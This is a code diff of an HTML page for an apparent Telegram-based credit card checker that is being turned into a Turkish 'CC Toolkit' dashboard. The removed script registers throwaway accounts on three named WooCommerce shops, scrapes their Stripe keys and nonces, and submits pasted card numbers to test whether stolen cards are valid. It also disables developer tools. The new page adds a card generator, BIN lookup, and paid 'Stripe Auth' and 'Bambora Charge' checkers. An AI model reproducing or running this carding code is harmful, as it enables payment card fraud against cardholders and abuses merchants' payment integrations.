@@ -1,567 +1,292 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr" data-theme="dark">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>Checker</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: #000;
-            color: #ccc;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 12px;
-        }
-
-        .app {
-            width: 100%;
-            max-width: 420px;
-            background: #0a0a0a;
-            border-radius: 24px;
-            padding: 20px 16px 24px;
-            border: 1px solid #181818;
-        }
-
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 18px;
-            padding-bottom: 12px;
-            border-bottom: 1px solid #141414;
-        }
-
-        .header .brand {
-            font-size: 20px;
-            font-weight: 700;
-            color: #e0e0e0;
-        }
-
-        .header .online {
-            font-size: 12px;
-            color: #333;
-        }
-
-        .header .online i {
-            color: #4ade80;
-            font-size: 7px;
-            margin-right: 4px;
-        }
-
-        textarea {
-            width: 100%;
-            padding: 14px;
-            background: #0d0d0d;
-            border: 1px solid #181818;
-            border-radius: 12px;
-            color: #d0d0d0;
-            font-size: 13px;
-            font-family: 'Courier New', monospace;
-            resize: vertical;
-            min-height: 90px;
-            outline: none;
-            line-height: 1.7;
-        }
-
-        textarea:focus {
-            border-color: #2a2a2a;
-        }
-
-        textarea::placeholder {
-            color: #222;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-        }
-
-        .card-count {
-            text-align: right;
-            font-size: 12px;
-            color: #222;
-            margin-top: 6px;
-        }
-
-        .gate-area {
-            background: #0a0a0a;
-            border-radius: 12px;
-            padding: 12px 14px;
-            margin: 14px 0;
-            border: 1px solid #141414;
-        }
-
-        .gate-area .gate-label {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 8px;
-        }
-
-        .gate-area .gate-label span {
-            font-size: 12px;
-            color: #444;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .gate-area select {
-            width: 100%;
-            padding: 10px 12px;
-            background: #0d0d0d;
-            border: 1px solid #181818;
-            border-radius: 8px;
-            color: #ccc;
-            font-size: 14px;
-            outline: none;
-            appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23333' stroke-width='2' fill='none'/%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: right 12px center;
-            cursor: pointer;
-        }
-
-        .start-btn {
-            width: 100%;
-            padding: 14px;
-            background: #141414;
-            border: 1px solid #222;
-            border-radius: 12px;
-            font-size: 15px;
-            font-weight: 600;
-            color: #e0e0e0;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .start-btn:active {
-            transform: scale(0.97);
-        }
-
-        .start-btn:disabled {
-            opacity: 0.3;
-        }
-
-        .stats-bar {
-            display: flex;
-            gap: 8px;
-            margin: 16px 0 12px;
-        }
-
-        .stats-bar .stat {
-            flex: 1;
-            text-align: center;
-            padding: 10px 0;
-            background: #0a0a0a;
-            border-radius: 10px;
-            border: 1px solid #141414;
-        }
-
-        .stats-bar .stat .number {
-            font-size: 20px;
-            font-weight: 700;
-            color: #e0e0e0;
-        }
-
-        .stats-bar .stat .label {
-            font-size: 9px;
-            color: #333;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-top: 2px;
-        }
-
-        .stats-bar .stat.approved .number { color: #4ade80; }
-        .stats-bar .stat.declined .number { color: #f87171; }
-
-        .results-area {
-            margin-top: 10px;
-            max-height: 280px;
-            overflow-y: auto;
-        }
-
-        .results-area::-webkit-scrollbar {
-            width: 3px;
-        }
-        .results-area::-webkit-scrollbar-track {
-            background: #0a0a0a;
-        }
-        .results-area::-webkit-scrollbar-thumb {
-            background: #1a1a1a;
-            border-radius: 3px;
-        }
-
-        .result-item {
-            display: flex;
-            flex-direction: column;
-            padding: 10px 12px;
-            background: #0d0d0d;
-            border-radius: 8px;
-            margin-bottom: 4px;
-            border-left: 2px solid #1a1a1a;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            animation: fadeIn 0.2s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateX(-5px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-
-        .result-item.approved {
-            border-left-color: #4ade80;
-        }
-        .result-item.declined {
-            border-left-color: #f87171;
-        }
-
-        .result-item .row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .result-item .cc {
-            color: #666;
-            font-size: 12px;
-        }
-        .result-item .status {
-            font-weight: 600;
-            font-size: 11px;
-        }
-        .result-item.approved .status { color: #4ade80; }
-        .result-item.declined .status { color: #f87171; }
-
-        .result-item .message {
-            font-size: 11px;
-            color: #444;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            margin-top: 4px;
-            padding-top: 4px;
-            border-top: 1px solid #141414;
-            word-break: break-all;
-        }
-
-        .no-results {
-            text-align: center;
-            color: #1a1a1a;
-            font-size: 13px;
-            padding: 16px 0;
-        }
-
-        .status-msg {
-            text-align: center;
-            font-size: 12px;
-            color: #2a2a2a;
-            margin-top: 6px;
-            min-height: 18px;
-        }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CC Toolkit</title>
+    <link rel="stylesheet" href="style.css" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <script src="security.js"></script>
 </head>
-<body>
-
-<div class="app">
-    <div class="header">
-        <div class="brand">checker</div>
-        <span class="online"><i>●</i> <span id="online-count">0</span></span>
-    </div>
-
-    <textarea id="card-input" placeholder="4111111111111111 | 12 | 2027 | 118"></textarea>
-    <div class="card-count"><span id="card-count">0</span> cards</div>
-
-    <div class="gate-area">
-        <div class="gate-label">
-            <span>gate</span>
-            <span id="gate-status" style="color:#333;">● stripe auth</span>
-        </div>
-        <select id="gate-select">
-            <option value="stripe_auth">stripe auth</option>
-        </select>
-    </div>
-
-    <button class="start-btn" id="start-btn" onclick="startCheck()">▶ start</button>
-
-    <div class="status-msg" id="status-msg"></div>
-
-    <div class="stats-bar">
-        <div class="stat">
-            <div class="number" id="live-count">0</div>
-            <div class="label">live</div>
-        </div>
-        <div class="stat approved">
-            <div class="number" id="approved-count">0</div>
-            <div class="label">approved</div>
-        </div>
-        <div class="stat declined">
-            <div class="number" id="declined-count">0</div>
-            <div class="label">declined</div>
-        </div>
-    </div>
-
-    <div class="results-area" id="results-container">
-        <div class="no-results">no results</div>
-    </div>
-</div>
-
-<script>
-    const tg = window.Telegram.WebApp;
-    tg.expand();
-
-    const user = tg.initDataUnsafe?.user || { id: 'guest' };
-
-    const input = document.getElementById('card-input');
-    const cardCount = document.getElementById('card-count');
-    const resultsContainer = document.getElementById('results-container');
-    const liveCount = document.getElementById('live-count');
-    const approvedCount = document.getElementById('approved-count');
-    const declinedCount = document.getElementById('declined-count');
-    const startBtn = document.getElementById('start-btn');
-    const statusMsg = document.getElementById('status-msg');
-
-    let live = 0, approved = 0, declined = 0;
-    let isRunning = false;
-
-    input.addEventListener('input', function() {
-        const lines = this.value.split('\n').filter(l => l.trim() !== '');
-        cardCount.textContent = lines.length;
-    });
-
-    document.addEventListener('keydown', (e) => {
-        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key.toUpperCase())) || (e.ctrlKey && e.key === 'u')) {
-            e.preventDefault();
-            tg.showAlert('disabled');
-        }
-    });
-    document.addEventListener('contextmenu', (e) => e.preventDefault());
-
-    // ========== STRIPE AUTH ==========
-    const AUTH_SITES = [
-        'https://pathosceramiche.com',
-        'https://josephamichael.com',
-        'https://perfectible.net'
-    ];
-
-    async function stripeAuthCheck(cc) {
-        const parts = cc.split('|');
-        if (parts.length < 4) {
-            return { status: 'declined', message: '❌ Invalid format' };
-        }
-
-        const [number, month, year, cvv] = parts;
-        const pan = number.replace(/\D/g, '');
-        const expM = month.padStart(2, '0');
-        const expY = year.slice(-2);
-        const cleanCVV = cvv;
-
-        if (pan.length < 15 || pan.length > 19) {
-            return { status: 'declined', message: '❌ Invalid card number' };
-        }
-
-        const sites = [...AUTH_SITES];
-        for (let i = sites.length - 1; i > 0; i--) {
-            const j = Math.floor(Math.random() * (i + 1));
-            [sites[i], sites[j]] = [sites[j], sites[i]];
-        }
-
-        let lastError = 'all sites failed';
-        for (const site of sites) {
-            try {
-                const result = await checkCardOnSite(site, pan, expM, expY, cleanCVV);
-                return result;
-            } catch (err) {
-                lastError = err.message || 'site error';
-            }
-        }
-
-        return { status: 'declined', message: `❌ ${lastError}` };
-    }
-
-    async function checkCardOnSite(baseUrl, pan, expM, expY, cvv) {
-        const addPmUrl = `${baseUrl}/my-account/add-payment-method/`;
-
-        const email = `user${Math.random().toString(36).slice(2, 10)}@gmail.com`;
-        const registerRes = await fetch(addPmUrl, {
-            method: 'POST',
-            headers: {
-                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
-                'Content-Type': 'application/x-www-form-urlencoded'
-            },
-            body: new URLSearchParams({
-                email: email,
-                woocommerce-register-nonce: '',
-                _wp_http_referer: '/my-account/add-payment-method/',
-                register: 'Register'
-            })
-        });
-
-        const html = await registerRes.text();
-
-        const keyMatch = html.match(/pk_(?:live|test)_[a-zA-Z0-9]+/);
-        if (!keyMatch) throw new Error('stripe key not found');
-        const stripePubKey = keyMatch[0];
-
-        let nonceMatch = html.match(/"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"/);
-        if (!nonceMatch) {
-            nonceMatch = html.match(/createAndConfirmSetupIntentNonce["\s:]+([^"\s,]+)/);
-        }
-        if (!nonceMatch) throw new Error('nonce not found');
-        const setupIntentNonce = nonceMatch[1];
-
-        const stripeRes = await fetch('https://api.stripe.com/v1/payment_methods', {
-            method: 'POST',
-            headers: {
-                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
-                'Accept': 'application/json',
-                'Origin': 'https://js.stripe.com',
-                'Referer': 'https://js.stripe.com/'
-            },
-            body: new URLSearchParams({
-                type: 'card',
-                'card[number]': pan,
-                'card[cvc]': cvv,
-                'card[exp_year]': expY,
-                'card[exp_month]': expM,
-                allow_redisplay: 'unspecified',
-                'billing_details[address][country]': 'TR',
-                key: stripePubKey,
-                _stripe_version: '2024-06-20'
-            })
-        });
-
-        const stripeData = await stripeRes.json();
-        const pmId = stripeData.id;
-        if (!pmId) {
-            const err = stripeData.error?.message || 'stripe error';
-            throw new Error(err);
-        }
-
-        const wcRes = await fetch(baseUrl, {
-            method: 'POST',
-            headers: {
-                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
-                'Accept': 'application/json, text/javascript, */*; q=0.01',
-                'x-requested-with': 'XMLHttpRequest',
-                'Origin': baseUrl,
-                'Referer': addPmUrl
-            },
-            body: new URLSearchParams({
-                'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
-                action: 'create_and_confirm_setup_intent',
-                'wc-stripe-payment-method': pmId,
-                'wc-stripe-payment-type': 'card',
-                _ajax_nonce: setupIntentNonce
-            })
-        });
-
-        const wcData = await wcRes.json();
-
-        if (wcData.success === true) {
-            return { status: 'approved', message: '✅ Auth Success' };
-        }
-
-        const errMsg = wcData.data?.error?.message || wcData.data?.message || 'auth failed';
-        return { status: 'declined', message: `❌ ${errMsg}` };
-    }
-
-    // ========== CHECK ==========
-    async function startCheck() {
-        if (isRunning) return;
-
-        const raw = input.value.trim();
-        if (!raw) {
-            tg.showAlert('paste at least one card.');
-            return;
-        }
-
-        const cards = raw.split('\n').filter(l => l.trim() !== '');
-
-        isRunning = true;
-        startBtn.disabled = true;
-        startBtn.textContent = '⏳ checking...';
-        statusMsg.textContent = `0 / ${cards.length}`;
-
-        live = approved = declined = 0;
-        updateStats();
-
-        const title = document.createElement('div');
-        title.style.cssText = 'font-size:11px;color:#222;margin-bottom:8px;';
-        title.textContent = 'results';
-        resultsContainer.innerHTML = '';
-        resultsContainer.appendChild(title);
-
-        for (let i = 0; i < cards.length; i++) {
-            const cc = cards[i].trim();
-            statusMsg.textContent = `${i + 1} / ${cards.length}`;
-
-            try {
-                const result = await stripeAuthCheck(cc);
-                const status = result.status || 'declined';
-                const message = result.message || '';
-                showResult(cc, status, message);
-                if (status === 'approved') approved++;
-                else declined++;
-                live++;
-                updateStats();
-            } catch (err) {
-                showResult(cc, 'declined', '❌ Error');
-                declined++;
-                live++;
-                updateStats();
-            }
-        }
-
-        isRunning = false;
-        startBtn.disabled = false;
-        startBtn.textContent = '▶ start';
-        statusMsg.textContent = `done. approved: ${approved}, declined: ${declined}`;
-        tg.showAlert(`done. approved: ${approved}, declined: ${declined}`);
-    }
-
-    function showResult(cc, status, message) {
-        const div = document.createElement('div');
-        div.className = `result-item ${status}`;
-        const masked = cc.length > 4 ? cc.slice(0, 4) + '****' + cc.slice(-4) : cc;
-        const statusText = status === 'approved' ? '✓ Approved' : '✗ Declined';
-        div.innerHTML = `
-            <div class="row">
-                <span class="cc">${masked}</span>
-                <span class="status">${statusText}</span>
+<body class="dashboard-page">
+    <div id="toast" class="toast"><i class="fas fa-check-circle"></i><span id="toastMessage">İşlem başarılı</span></div>
+    <div id="dashboard">
+        <!-- Sidebar -->
+        <div class="sidebar-overlay" id="sidebarOverlay"></div>
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-header">
+                <div class="sidebar-brand">
+                    <div class="brand-text">
+                        <span style="font-size:22px;font-weight:800;letter-spacing:-0.5px;color:var(--text-primary);">☰ Menü</span>
+                    </div>
+                    <button id="adminPanelBtn" class="admin-panel-btn" style="display:none;background:var(--accent);color:#fff;border:none;padding:6px 14px;border-radius:20px;font-size:12px;font-weight:600;cursor:pointer;transition:all 0.2s;margin-left:10px;align-items:center;gap:4px;">
+                        <i class="fas fa-shield-alt"></i> Admin Panel
+                    </button>
+                </div>
+                <button class="sidebar-close" id="sidebarClose"><i class="fas fa-times"></i></button>
             </div>
-            <div class="message">${message || ''}</div>
-        `;
-        resultsContainer.appendChild(div);
-        const noResult = resultsContainer.querySelector('.no-results');
-        if (noResult) noResult.remove();
-        resultsContainer.scrollTop = resultsContainer.scrollHeight;
-    }
+            <nav class="sidebar-nav">
+                <div class="nav-label">Ana</div>
+                <div class="nav-item active" data-tab="dashboard"><i class="fas fa-home"></i> Ana Sayfa</div>
+                <div class="nav-item nav-toggle" id="toolsToggle"><i class="fas fa-tools"></i> Tools <i class="fas fa-chevron-down" style="margin-left:auto;font-size:12px;"></i></div>
+                <div class="nav-sub" id="toolsSub">
+                    <div class="nav-item sub-item" data-tab="generator"><i class="fas fa-plus-circle"></i> CC Generator</div>
+                    <div class="nav-item sub-item" data-tab="validator"><i class="fas fa-check-circle"></i> CC Validator</div>
+                    <div class="nav-item sub-item" data-tab="binsorgu"><i class="fas fa-search"></i> CC BIN Lookup</div>
+                </div>
+                <div class="nav-item nav-toggle" id="checkoutToggle"><i class="fas fa-shopping-cart"></i> Check-out <i class="fas fa-chevron-down" style="margin-left:auto;font-size:12px;"></i></div>
+                <div class="nav-sub" id="checkoutSub">
+                    <div class="nav-item sub-item checkout-item" data-tab="stripeauth" style="padding-left:40px !important;font-size:12px !important;"><i class="fab fa-stripe" style="color:#6772e5;width:16px;"></i> Stripe Auth</div>
+                    <div class="nav-item sub-item checkout-item" data-tab="bambora" style="padding-left:40px !important;font-size:12px !important;"><i class="fas fa-credit-card" style="color:#ff6b6b;width:16px;"></i> Bambora Charge</div>
+                </div>
+                <div class="nav-item nav-toggle" id="gamesToggle"><i class="fas fa-gamepad"></i> Oyunlar <i class="fas fa-chevron-down" style="margin-left:auto;font-size:12px;"></i></div>
+                <div class="nav-sub" id="gamesSub">
+                    <div class="nav-item sub-item" data-tab="wheel"><i class="fas fa-spinner"></i> Çarkıfelek</div>
+                    <div class="nav-item sub-item" data-tab="guess"><i class="fas fa-brain"></i> Sayı Tahmin</div>
+                    <div class="nav-item sub-item" data-tab="coinflip"><i class="fas fa-coins"></i> Yazı Tura</div>
+                    <div class="nav-item sub-item" data-tab="dice"><i class="fas fa-dice"></i> Zar At</div>
+                    <div class="nav-item sub-item" data-tab="rps"><i class="fas fa-hand-rock"></i> Taş Kağıt Makas</div>
+                </div>
+                <div class="nav-item nav-toggle" id="otherToolsToggle"><i class="fas fa-ellipsis-h"></i> Diğer <i class="fas fa-chevron-down" style="margin-left:auto;font-size:12px;"></i></div>
+                <div class="nav-sub" id="otherToolsSub">
+                    <div class="nav-item sub-item" data-tab="chat"><i class="fas fa-comment-dots"></i> Sohbet</div>
+                    <div class="nav-item sub-item" data-tab="ai"><i class="fas fa-robot"></i> Zenit AI</div>
+                    <div class="nav-item sub-item" data-tab="ayarlar"><i class="fas fa-cog"></i> Ayarlar</div>
+                </div>
+                <div class="nav-item" data-tab="bakiye"><i class="fas fa-wallet"></i> Bakiye</div>
+                <div class="nav-item" id="adminNavItem" data-tab="admin" style="display:none;"><i class="fas fa-shield-alt"></i> Admin Panel</div>
+            </nav>
+            <div class="sidebar-footer">
+                <div class="nav-item" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Çıkış Yap</div>
+            </div>
+        </aside>
 
-    function updateStats() {
-        liveCount.textContent = live;
-        approvedCount.textContent = approved;
-        declinedCount.textContent = declined;
-    }
+        <!-- Main Content -->
+        <main class="main-content">
+            <header class="top-header">
+                <div class="header-left">
+                    <button class="menu-toggle" id="menuToggle"><i class="fas fa-bars"></i></button>
+                    <div class="page-title"><h1 id="pageTitle">Ana Sayfa</h1><p id="pageSubtitle">Genel bakış</p></div>
+                </div>
+                <div class="header-actions">
+                    <button class="theme-toggle" id="themeToggle"><i class="fas fa-sun"></i></button>
+                    <button class="radio-toggle" id="radioToggle" title="Radyo"><i class="fas fa-music"></i></button>
+                    <button class="radio-toggle" id="radioPrev" title="Geri"><i class="fas fa-backward"></i></button>
+                    <button class="radio-toggle" id="radioNext" title="İleri"><i class="fas fa-forward"></i></button>
+                    <div class="user-avatar" id="userAvatar">M</div>
+                </div>
+            </header>
 
-    // Online ping
-    setInterval(async () => {
-        try {
-            const res = await fetch('/api/online', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ user_id: user.id })
-            });
-            const data = await res.json();
-            document.getElementById('online-count').textContent = data.online || 0;
-        } catch (_) {}
-    }, 30000);
+            <div class="dashboard-grid">
+                <!-- DASHBOARD -->
+                <div id="tab-dashboard" class="tab-content">
+                    <div class="card-grid">
+                        <div class="card stat-card"><div class="stat-icon"><i class="fas fa-wallet"></i></div><div class="stat-info"><span class="stat-label">Bakiyen</span><span class="stat-value" id="myBalance">0.00 TL</span></div></div>
+                        <div class="card stat-card"><div class="stat-icon"><i class="fas fa-users"></i></div><div class="stat-info"><span class="stat-label">Toplam Kullanıcı</span><span class="stat-value" id="totalUsers">0</span></div></div>
+                        <div class="card stat-card"><div class="stat-icon"><i class="fas fa-crown"></i></div><div class="stat-info"><span class="stat-label">Premium</span><span class="stat-value" id="premiumCount">0</span></div></div>
+                        <div class="card stat-card"><div class="stat-icon"><i class="fas fa-user"></i></div><div class="stat-info"><span class="stat-label">Normal</span><span class="stat-value" id="normalCount">0</span></div></div>
+                        <div class="card stat-card"><div class="stat-icon"><i class="fas fa-circle" style="color:#34c759;"></i></div><div class="stat-info"><span class="stat-label">Çevrim İçi</span><span class="stat-value" id="onlineCount">0</span></div></div>
+                    </div>
+                    <div class="card live-card"><div class="live-message"><i class="fas fa-info-circle"></i> Manuel işlemler için <strong>@admin</strong></div></div>
+                </div>
 
-    cardCount.textContent = input.value.split('\n').filter(l => l.trim() !== '').length;
-</script>
-</body>
-</html>
+                <!-- GENERATOR -->
+                <div id="tab-generator" class="tab-content hidden">
+                    <div class="card">
+                        <div class="card-header"><h3><i class="fas fa-plus-circle" style="color:#007aff;margin-right:10px;"></i>CC Generator</h3><button class="btn btn-outline" id="copyAllBtn" style="font-size:12px;padding:6px 14px;"><i class="fas fa-copy"></i> Tümünü Kopyala</button></div>
+                        <div class="card-body">
+                            <div class="gen-grid">
+                                <div class="gen-field"><label>BIN</label><input type="text" id="genBin" placeholder="411111" maxlength="8" value="411111" /></div>
+                                <div class="gen-field"><label>CVV</label><input type="text" id="genCvv" placeholder="123" maxlength="4" value="123" /></div>
+                                <div class="gen-field"><label>Ay</label><input type="text" id="genMonth" placeholder="12" maxlength="2" value="12" /></div>
+                                <div class="gen-field"><label>Yıl</label><input type="text" id="genYear" placeholder="2028" maxlength="4" value="2028" /></div>
+                                <div class="gen-field"><label>Adet</label><input type="number" id="genCount" value="5" min="1" max="50" /></div>
+                            </div>
+                            <button class="btn" id="generateBtn" style="width:100%;"><i class="fas fa-sync-alt"></i> Üret (1 TL)</button>
+                            <div class="result-box" id="genResult" style="min-height:60px;max-height:400px;overflow-y:auto;padding:0;font-family:monospace;font-size:13px;"><div id="ccList" style="padding:8px 12px;"><div style="color:var(--text-muted);text-align:center;padding:16px;">Henüz kart üretilmedi.</div></div></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- VALIDATOR -->
+                <div id="tab-validator" class="tab-content hidden">
+                    <div class="card">
+                        <div class="card-header"><h3><i class="fas fa-check-circle" style="color:#007aff;margin-right:10px;"></i>Kart Doğrula</h3></div>
+                        <div class="card-body">
+                            <div class="input-group"><input type="text" id="ccValidateInput" placeholder="Kart numarası" /><button class="btn" id="validateBtn">Doğrula</button></div>
+                            <div class="result-box" id="validateResult"><span class="label">Sonuç</span><span class="value" style="color:var(--text-muted);">Kart numarası girin.</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- BIN -->
+                <div id="tab-binsorgu" class="tab-content hidden">
+                    <div class="card">
+                        <div class="card-header"><h3><i class="fas fa-search" style="color:#007aff;margin-right:10px;"></i>BIN Sorgulama</h3></div>
+                        <div class="card-body">
+                            <div class="input-group"><input type="text" id="binInput" placeholder="BIN girin (6 hane)" /><button class="btn" id="binSorguBtn">Sorgula</button></div>
+                            <div class="result-box" id="binResult"><span class="label">BIN Bilgileri</span><span class="value" style="color:var(--text-muted);">BIN girin.</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- STRIPE AUTH -->
+                <div id="tab-stripeauth" class="tab-content hidden">
+                    <div class="card">
+                        <div class="card-header"><h3 style="text-align:center;width:100%;"><i class="fab fa-stripe" style="color:#6772e5;margin-right:10px;"></i>Stripe Auth</h3></div>
+                        <div class="card-body">
+                            <div style="margin-bottom:12px;"><label style="font-size:13px;font-weight:600;color:var(--text-muted);">Kartlar (kart|ay|yy|cvv)</label><textarea id="stripeInput" rows="4" placeholder="4159750016461072|09|29|008&#10;4111111111111111|12|28|123" style="width:100%;padding:10px;background:var(--bg-input);border-radius:var(--radius-sm);border:2px solid var(--border-color);color:var(--text-primary);font-family:monospace;font-size:14px;resize:vertical;"></textarea></div>
+                            <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px;"><button class="btn" id="stripePasteBtn"><i class="fas fa-paste"></i> Yapıştır</button><button class="btn" id="stripeCheckBtn"><i class="fas fa-play"></i> Başlat (3 TL/kart)</button></div>
+                            <div style="margin-bottom:12px;"><span style="font-weight:600;color:var(--text-secondary);">Sonuçlar</span><div style="display:flex;gap:16px;margin-top:6px;flex-wrap:wrap;"><button class="stat-btn valid-btn" id="liveFilterBtn">LIVE [<span id="liveCount">0</span>]</button><button class="stat-btn invalid-btn" id="deadFilterBtn">DEAD [<span id="deadCount">0</span>]</button><button class="stat-btn" id="allFilterBtn">Tümü [<span id="totalCount">0</span>]</button></div></div>
+                            <div class="result-box" id="stripeResult" style="min-height:60px;max-height:400px;overflow-y:auto;padding:8px 12px;font-family:monospace;font-size:13px;"><div style="color:var(--text-muted);text-align:center;padding:16px;">Kart girip başlatın.</div></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- BAMBORA -->
+                <div id="tab-bambora" class="tab-content hidden">
+                    <div class="card">
+                        <div class="card-header"><h3 style="text-align:center;width:100%;"><i class="fas fa-credit-card" style="color:#ff6b6b;margin-right:10px;"></i>Bambora Charge</h3></div>
+                        <div class="card-body">
+                            <div style="margin-bottom:12px;"><label style="font-size:13px;font-weight:600;color:var(--text-muted);">Kartlar (kart|ay|yy|cvv)</label><textarea id="bamboraInput" rows="4" placeholder="5168404439746810|01|29|153&#10;4111111111111111|12|28|123" style="width:100%;padding:10px;background:var(--bg-input);border-radius:var(--radius-sm);border:2px solid var(--border-color);color:var(--text-primary);font-family:monospace;font-size:14px;resize:vertical;"></textarea></div>
+                            <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px;"><input type="number" id="bamboraAmount" placeholder="Miktar (TL)" style="flex:1;min-width:120px;padding:10px;background:var(--bg-input);border-radius:var(--radius-sm);border:2px solid var(--border-color);color:var(--text-primary);" value="10" /><button class="btn" id="bamboraCheckBtn"><i class="fas fa-play"></i> Başlat (2 TL/kart)</button></div>
+                            <div style="margin-bottom:12px;"><span style="font-weight:600;color:var(--text-secondary);">Sonuçlar</span><div style="display:flex;gap:16px;margin-top:6px;flex-wrap:wrap;"><button class="stat-btn valid-btn" id="bamboraLiveFilter">LIVE [<span id="bamboraLiveCount">0</span>]</button><button class="stat-btn invalid-btn" id="bamboraDeadFilter">DEAD [<span id="bamboraDeadCount">0</span>]</button><button class="stat-btn" id="bamboraAllFilter">Tümü [<span id="bamboraTotalCount">0</span>]</button></div></div>
+                            <div class="result-box" id="bamboraResult" style="min-height:60px;max-height:400px;overflow-y:auto;padding:8px 12px;font-family:monospace;font-size:13px;"><div style="color:var(--text-muted);text-align:center;padding:16px;">Kart girip başlatın.</div></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- WHEEL -->
+                <div id="tab-wheel" class="tab-content hidden">
+                    <div class="card" style="text-align:center;">
+                        <div class="card-header"><h3><i class="fas fa-spinner" style="color:#007aff;margin-right:10px;"></i>Çarkıfelek</h3></div>
+                        <div class="card-body">
+                            <div style="position:relative;display:inline-block;margin:0 auto;"><canvas id="wheelCanvas" width="300" height="300" style="border-radius:50%;box-shadow:0 8px 40px rgba(0,0,0,0.2);"></canvas><div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:24px;font-weight:800;color:var(--text-primary);background:var(--bg-card);padding:4px 14px;border-radius:12px;border:2px solid var(--border-color);">ÇEVİR</div></div>
+                            <div id="wheelResult" style="font-size:20px;font-weight:700;min-height:50px;margin:12px 0;color:var(--text-primary);"></div>
+                            <div style="display:flex;gap:16px;justify-content:center;flex-wrap:wrap;"><button class="btn" id="spinBtn" style="font-size:16px;padding:10px 28px;"><i class="fas fa-sync-alt"></i> Çevir</button><span id="spinStatus" style="font-size:14px;color:var(--text-muted);display:flex;align-items:center;">Kalan: <span id="spinUsed">1</span></span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- GUESS -->
+                <div id="tab-guess" class="tab-content hidden">
+                    <div class="card">
+                        <div class="card-header"><h3><i class="fas fa-brain" style="color:#007aff;margin-right:10px;"></i>Sayı Tahmin (10 TL)</h3></div>
+                        <div class="card-body" style="text-align:center;">
+                            <p style="color:var(--text-secondary);">1-100 arası bir sayı tahmin et!</p>
+                            <div style="display:flex;gap:10px;justify-content:center;margin:12px 0;flex-wrap:wrap;"><input type="number" id="guessInput" min="1" max="100" placeholder="Tahmin" style="width:120px;padding:10px;background:var(--bg-input);border-radius:8px;border:2px solid var(--border-color);color:var(--text-primary);text-align:center;font-size:18px;" /><button class="btn" id="guessBtn">Tahmin Et</button></div>
+                            <div id="guessResult" style="font-size:18px;font-weight:600;min-height:40px;color:var(--text-primary);"></div>
+                            <div id="guessStatus" style="font-size:13px;color:var(--text-muted);margin-top:6px;">Kalan: <span id="guessLeft">4</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- COINFLIP -->
+                <div id="tab-coinflip" class="tab-content hidden">
+                    <div class="card">
+                        <div class="card-header"><h3><i class="fas fa-coins" style="color:#007aff;margin-right:10px;"></i>Yazı Tura (5 TL)</h3></div>
+                        <div class="card-body" style="text-align:center;">
+                            <div style="font-size:64px;margin:12px 0;" id="coinResult">🪙</div>
+                            <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap;"><button class="btn" id="coinHeads">Yazı</button><button class="btn" id="coinTails">Tura</button></div>
+                            <div id="coinStatus" style="margin-top:12px;font-size:14px;color:var(--text-muted);"></div>
+                            <div id="coinLeft" style="font-size:13px;color:var(--text-muted);margin-top:4px;">Kalan: <span id="coinRemain">4</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- DICE -->
+                <div id="tab-dice" class="tab-content hidden">
+                    <div class="card">
+                        <div class="card-header"><h3><i class="fas fa-dice" style="color:#007aff;margin-right:10px;"></i>Zar At (5 TL)</h3></div>
+                        <div class="card-body" style="text-align:center;">
+                            <div style="font-size:72px;margin:12px 0;" id="diceResult">🎲</div>
+                            <button class="btn" id="diceBtn"><i class="fas fa-dice"></i> At</button>
+                            <div id="diceStatus" style="margin-top:12px;font-size:14px;color:var(--text-muted);"></div>
